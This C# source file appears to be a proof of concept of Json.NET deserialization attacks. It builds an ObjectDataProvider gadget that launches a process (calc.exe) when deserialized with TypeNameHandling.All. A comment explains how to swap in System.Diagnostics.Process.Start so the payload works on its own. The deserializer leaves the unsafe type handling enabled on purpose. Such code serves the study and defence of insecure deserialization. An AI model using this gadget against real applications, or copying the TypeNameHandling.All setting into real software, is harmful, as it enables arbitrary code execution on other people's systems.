using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Text;
using Newtonsoft.Json;
using System.Windows.Data;

namespace Deserialize
{

    [JsonObject(MemberSerialization.OptIn)]
    public class TestClass
    {
        private string classname;
        private string name;
        private int age;
        [JsonIgnore]
        public string Classname { get => classname; set => classname = value; }
        [JsonProperty]
        public string Name { get => name; set => name = value; }
        [JsonProperty]
        public int Age { get => age; set => age = value; }

        public override string ToString()
        {
            return base.ToString();
        }

        public static void ClassMethod(string cmd)
        {
            Process.Start(cmd);
        }
    }

    class Program
    {

        static string jsonSer()
        {
            var testClass = new TestClass();
            testClass.Classname = "GJAQJ";
            testClass.Name = "test";
            testClass.Age = 16;


            // 注意 这里ObjectDataProvider 里放的是 TestClass
            // 但是在生成payload后可以将其直接替换为 System.Diagnostics.Process 的Start 函数
            // 这样就不会依赖于 TestClass
            ObjectDataProvider odp = new ObjectDataProvider();
            odp.MethodName = "ClassMethod";
            odp.MethodParameters.Add("calc.exe");
            odp.ObjectInstance = testClass;

            var serSettings = new JsonSerializerSettings
            {
                NullValueHandling = NullValueHandling.Ignore,
                TypeNameAssemblyFormatHandling = TypeNameAssemblyFormatHandling.Full,
                TypeNameHandling = TypeNameHandling.All
            };
            string jsonString = JsonConvert.SerializeObject(odp, serSettings);
            Console.WriteLine(jsonString);
            return jsonString;
        }

        static void jsonDser(string jsonString)
        {

            var jsonSet = new JsonSerializerSettings
            {
                //TypeNameHandling = TypeNameHandling.None
                TypeNameHandling = TypeNameHandling.All
            };

            Object obj = JsonConvert.DeserializeObject(jsonString, jsonSet);

            Type t = obj.GetType();
            PropertyInfo propertyInstance = t.GetProperty("ObjectInstance");
            object objtest = propertyInstance.GetValue(obj, null);

            Type t2 = objtest.GetType();
            PropertyInfo propertyName = t2.GetProperty("Name");
            object name = propertyName.GetValue(objtest, null);

        }
        static void Main(string[] args)
        {
            string jsonString = jsonSer();
            jsonDser(jsonString);
        }
    }
}
